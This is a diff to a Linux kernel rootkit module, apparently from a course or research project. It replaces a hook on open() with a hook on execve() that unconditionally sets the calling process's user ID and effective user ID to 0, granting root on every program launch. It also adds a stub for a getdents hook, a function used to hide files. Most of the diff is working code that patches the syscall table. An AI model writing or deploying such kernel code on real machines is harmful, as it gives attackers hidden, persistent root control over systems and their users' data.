@@ -216,7 +216,7 @@ t_syscall_hook *new_hook(const unsigned int offset, void *newFunc)
  */
 int init_module(void)
 {
-  printk(KERN_INFO "Rootkit module initalizing.\n");
+  printk(KERN_INFO "Rootkit module initializing.\n");
 
   //Allocate & init a list to store our syscall_hooks
   hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
@@ -235,8 +235,9 @@ int init_module(void)
   set_addr_rw((unsigned long) sys_call_table);
   printk(KERN_INFO "After call to set_addr_rw\n");
 
-  //Let's hook open() for an example of how to use the framework
-  hook_syscall(new_hook(__NR_open, (void*) &new_open));
+  //Hook the syscall
+  //hook_syscall(new_hook(__NR_open, (void*) &new_open)); //Uncomment to hook open()
+  hook_syscall(new_hook(__NR_execve, (void*) &new_execve));
   printk(KERN_INFO "After call to hook_syscall\n");
 
   set_addr_ro((unsigned long) sys_call_table);
@@ -319,3 +320,42 @@ asmlinkage int new_open(const char *pathname, int flags, mode_t mode)
   //	You will want to add function prototypes to rootkit.h
   //	Make sure they match the original function definitions.
   //********
+
+asmlinkage int new_execve(const char *filename, char *const argv[],
+                          char *const envp[])
+{
+  int (*orig_func)(const char *filename, char *const argv[], char *const envp[]);
+  t_syscall_hook *execve_hook;
+
+  execve_hook = find_syscall_hook(__NR_execve);
+  orig_func = (void*) execve_hook->orig_func;
+
+  printk(KERN_INFO "Executing %s\n", filename);
+  printk(KERN_INFO "Effective UID before switch %d\n", current_euid());
+
+  // TODO Need to make this conditional based on passed in UID
+  if (1) {
+    struct cred *new_cred = prepare_creds();  
+
+    if (new_cred != NULL) {
+      //Modify new_cred to have an UID and eUID of 0
+      new_cred->uid = 0;
+      new_cred->euid = 0;
+
+      //Commit new_cred
+      commit_creds(new_cred);
+    } else {
+      //prepare_creds() returned NULL, so abort
+      abort_creds(new_cred);
+    }
+  }
+
+  return (*orig_func)(filename, argv, envp);
+}
+
+asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp,
+                            unsigned int count)
+{
+  //TODO
+  return 0; // TODO Temp
+}
